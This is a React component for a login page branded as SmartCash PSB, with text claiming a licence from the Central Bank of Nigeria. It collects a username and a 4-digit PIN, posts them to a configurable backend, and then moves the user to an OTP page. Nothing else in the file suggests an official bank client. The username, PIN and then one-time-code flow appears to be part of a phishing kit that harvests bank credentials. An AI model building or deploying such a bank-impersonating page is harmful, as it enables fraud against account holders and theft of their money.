import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import logo from "../assets/logo.png";
import axios from "axios";
import "../App.css";
import "../styles/pin.css";
import BASE_URL from "../components/urls";
import FormErrMsg from "../components/FormErrMsg";

// Validation schema using yup
const schema = yup.object().shape({
  username: yup.string().required("Username is required"),
  pin: yup
    .string()
    .matches(/^\d{4}$/, "PIN must be exactly 4 digits")
    .required("PIN is required"),
});

const Pin = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    reset,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [loading, setLoading] = useState(false);

  // Handle form submission
  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/pin`, data)
      .then((response) => {
        console.log(response.data);
        reset();
        navigate("/otp");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };
  const handleInputChange = (e) => {
    const value = e.target.value;
    e.target.value = value.replace(/\D/g, "");
  };
  return (
    <div className="pinContainer">
      <div className="pin-section">
        <div className="pinlogo">
          <img src={logo} alt="logo" />
        </div>
        <form onSubmit={handleSubmit(submitForm)} className="login-form">
          <div className="input-group">
            <div className="label">Username</div>
            <input
              type="text"
              name="username"
              className="username-input"
              {...register("username")}
            />
          </div>
          <div className="input-group">
            <div className="label">Pin</div>
            <input
              type="password"
              name="pin"
              maxLength="4"
              required
              inputMode="numeric"
              pattern="\d*"
              onInput={handleInputChange}
              {...register("pin")}
              className="pin-box"
            />
          </div>
          <div className="cash">
            <div>SmartCash PSB - Licensed by the Central Bank of Nigeria</div>
          </div>

          <button type="submit" className="pinBtn" disabled={loading}>
            {loading ? "Loading..." : "Submit"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default Pin;
